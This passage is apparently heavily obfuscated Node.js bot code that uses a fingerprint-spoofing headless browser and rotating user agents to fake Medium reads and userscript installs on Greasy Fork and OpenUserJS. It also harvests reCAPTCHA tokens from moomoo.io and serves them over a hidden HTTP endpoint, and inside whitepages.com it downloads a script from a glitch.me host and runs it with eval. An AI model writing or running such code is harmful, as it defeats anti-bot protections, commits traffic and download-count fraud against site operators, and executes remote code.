      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + Z(0x14) + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0x11) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + X(0x12) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1cf * 0x11 + 0x2f9 * 0x9 + 0x1 * -0x3980
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1 * 0x15c1 + 0x168a + 0x3 * -0x43)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xa7e + 0x1c21 + 0x113f * -0x1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xa93 + 0x52a + -0xf59), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a0 = b,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x57 * -0x51 + -0x33 * 0x15 + -0x1758;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r[a0(0xe, 'a*1V')](), await q();
          for (let w = -0x15 * 0xb4 + 0x1 * -0x161b + -0x24df * -0x1; w < getRandomInt(0x19cc + -0x2 * -0xc2e + -0x25 * 0x15b, -0x1bf5 + -0xb9e + 0x2798); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x2851 + 0xc4 * 0x8d + 0x561b);
        }
      }();
    }, -0xaf1 + 0x15d * -0x9 + 0x179a), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x2 * -0x59 + 0x1ae * 0x9 + -0xfd0;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x8b * 0x47 + -0x1749 + 0x1 * -0xf44, -0x1d06 + -0x1 * -0x1dae + -0x2 * 0x3b)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x3455 * -0x2 + 0xcf98 + -0xc312);
    }, 0x129 * 0x3 + -0x168e + 0x1377), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x2fc + -0x1fa9 * -0x1 + -0x1cad;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x68 * -0x5 + -0x20b + -0xfcb * -0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0xe52 + 0x1 * 0x155d + -0x23af), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x6b9b6 + 0x14c188 + 0x2 * -0x6dfcf);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2004 + 0x1ff2 + -0x2 * -0x3b);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x7b6 + 0x249b * 0x1 + -0x2b89);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2 * 0xf7b + 0x9 * 0x1f + -0x7d);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b;
  async function f() {
    const a2 = c,
      a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1087 * 0x1 + -0x9e0 * 0x3 + 0x2e28) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xded + 0x1 * -0xce0 + -0x2 * -0xd67));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1d90 + 0x2 * -0x1a5 + -0x1a46, D['indexOf']('\x20'));
        return B ? E['slice'](-0x96e + -0x22f7 + 0x2c65, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2 * -0xad1 + -0x1 * 0x23f9 + -0x3 * -0x2039),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + a1(0x9) + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x32f2 * -0x1 + -0x139f + 0x7 * 0x11b),
      'headers': {
        'host': 'openuserjs' + a2(0x13),
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': a2(0x8),
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + a3(0xa, 'n[LQ') + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
